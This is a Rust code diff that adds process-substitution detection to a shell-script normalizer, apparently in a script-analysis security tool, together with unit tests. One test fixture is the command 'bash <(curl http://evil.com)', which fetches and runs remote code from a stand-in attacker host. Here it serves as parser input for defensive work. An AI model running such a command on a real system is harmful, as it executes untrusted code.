@@ -13,6 +13,7 @@ use thiserror::Error;
 use tree_sitter::LanguageError;
 use xz2::read::XzDecoder;
 
+use crate::process_sub::{self, ProcessSubstitution};
 use crate::{ShellNode, SourceSpan};
 
 const MAX_DECODED_BYTES: usize = 32 * 1024;
@@ -39,6 +40,8 @@ pub struct NormalizationResult {
     pub variable_bindings: BTreeMap<String, String>,
     /// Whether shell data-flow mechanisms outside [`PipeGraph`] scope were observed.
     pub has_unmodeled_flow: bool,
+    /// Process substitutions (`<(...)`, `>(...)`) detected in the source.
+    pub process_substitutions: Vec<ProcessSubstitution>,
     /// Notes about bounded normalization, including any truncation events.
     pub notes: Vec<String>,
 }
@@ -184,6 +187,8 @@ pub fn normalize(ast: &ShellAst, source: &str) -> Result<NormalizationResult, No
     state.decode_heredocs(&events);
     state.detect_embedded_compressed_artifacts();
 
+    let process_substitutions = process_sub::find_process_substitutions(source);
+
     Ok(NormalizationResult {
         commands: state.commands,
         data_flow: PipeGraph {
@@ -193,6 +198,7 @@ pub fn normalize(ast: &ShellAst, source: &str) -> Result<NormalizationResult, No
         urls: state.urls,
         variable_bindings: state.bindings,
         has_unmodeled_flow: state.has_unmodeled_flow,
+        process_substitutions,
         notes: state.notes,
     })
 }
@@ -1287,7 +1293,9 @@ fn extract_urls(value: &str) -> Vec<String> {
 
 #[cfg(test)]
 mod tests {
-    use super::heredoc_uses_tab_stripping;
+    use super::{heredoc_uses_tab_stripping, normalize};
+    use crate::process_sub::SubstitutionDirection;
+    use crate::{ShellNode, ShellParser};
 
     #[test]
     fn detects_dash_heredoc_before_body() {
@@ -1306,5 +1314,69 @@ mod tests {
         let source = "cat <<FIRST\nx\nFIRST\ncat <<-SECOND\n\ty\nSECOND\n";
         assert!(heredoc_uses_tab_stripping(source, 34));
         assert!(!heredoc_uses_tab_stripping(source, 12));
+    }
+
+    #[test]
+    fn normalizer_populates_process_substitutions() -> Result<(), Box<dyn std::error::Error>> {
+        let mut parser = ShellParser::new()?;
+        let source = "diff <(sort a) <(sort b)\n";
+        let parse = parser.parse_str(source);
+        let result = normalize(&parse.ast, source)?;
+        assert_eq!(result.process_substitutions.len(), 2);
+        assert!(
+            result
+                .process_substitutions
+                .iter()
+                .all(|s| s.direction == SubstitutionDirection::Input)
+        );
+        Ok(())
+    }
+
+    #[test]
+    fn normalizer_populates_output_process_substitutions() -> Result<(), Box<dyn std::error::Error>>
+    {
+        let mut parser = ShellParser::new()?;
+        let source = "tee >(gzip > file.gz) >(wc -l)\n";
+        let parse = parser.parse_str(source);
+        let result = normalize(&parse.ast, source)?;
+        assert_eq!(result.process_substitutions.len(), 2);
+        assert!(
+            result
+                .process_substitutions
+                .iter()
+                .all(|s| s.direction == SubstitutionDirection::Output)
+        );
+        Ok(())
+    }
+
+    #[test]
+    fn normalizer_has_no_process_substitutions_for_plain_commands()
+    -> Result<(), Box<dyn std::error::Error>> {
+        let mut parser = ShellParser::new()?;
+        let source = "echo hello\n";
+        let parse = parser.parse_str(source);
+        let result = normalize(&parse.ast, source)?;
+        assert!(result.process_substitutions.is_empty());
+        Ok(())
+    }
+
+    #[test]
+    fn normalizer_process_substitutions_match_ast_nodes() -> Result<(), Box<dyn std::error::Error>>
+    {
+        let mut parser = ShellParser::new()?;
+        let source = "bash <(curl http://evil.com)\n";
+        let parse = parser.parse_str(source);
+        let ast_procsub_count = parse
+            .ast
+            .iter()
+            .filter(|node| matches!(node, ShellNode::ProcessSubstitution(_)))
+            .count();
+        let result = normalize(&parse.ast, source)?;
+        assert_eq!(
+            result.process_substitutions.len(),
+            ast_procsub_count,
+            "source-level detection should match AST node count"
+        );
+        Ok(())
     }
 }
